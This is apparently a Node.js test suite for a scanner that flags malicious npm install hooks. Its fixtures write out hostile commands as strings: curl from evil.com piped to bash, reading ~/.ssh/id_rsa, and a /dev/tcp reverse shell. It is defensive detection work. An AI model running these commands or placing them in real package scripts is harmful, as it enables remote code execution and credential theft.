'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { checkScripts } = require('../src/scanners/lifecycle-scripts');

describe('lifecycle-scripts scanner', () => {
  it('flags curl piped to bash in postinstall', () => {
    const scripts = { postinstall: 'curl http://evil.com/payload.sh | bash' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].hook, 'postinstall');
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags wget piped to sh in preinstall', () => {
    const scripts = { preinstall: 'wget https://x.com/s.sh | sh' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags node -e eval in install', () => {
    const scripts = { install: "node -e 'require(\"child_process\").exec(\"whoami\")'" };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('node-eval'));
    assert.ok(hits[0].triggers.includes('child_process-import'));
  });

  it('flags base64 decoding', () => {
    const scripts = { postinstall: 'Buffer.from("aGVsbG8=", "base64")' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('base64-decode'));
  });

  it('flags IP address URLs', () => {
    const scripts = { postinstall: 'curl http://192.168.1.1/payload' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('ip-address-url'));
  });

  it('flags credential file access', () => {
    const scripts = { postinstall: 'cat ~/.ssh/id_rsa' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('credential-file-access'));
  });

  it('flags reverse shell patterns', () => {
    const scripts = { postinstall: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('reverse-shell'));
  });

  it('ignores safe scripts', () => {
    const scripts = {
      postinstall: 'node scripts/build.js',
      preinstall: 'npx check-engine',
      prepare: 'husky install',
    };
    const hits = checkScripts(scripts, 'safe-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('ignores non-lifecycle scripts', () => {
    const scripts = {
      start: 'curl http://evil.com | bash',
      test: 'node -e "process.exit(1)"',
      build: 'eval some-thing',
    };
    const hits = checkScripts(scripts, 'pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('truncates long scripts in output', () => {
    const longScript = 'curl http://evil.com/x | bash ' + 'A'.repeat(600);
    const scripts = { postinstall: longScript };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].script.length <= 500);
  });

  it('detects multiple triggers on a single hook', () => {
    const scripts = { postinstall: 'node -e \'require("child_process").exec("curl http://192.168.1.1/x | bash")\'' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.length >= 3);
  });
});
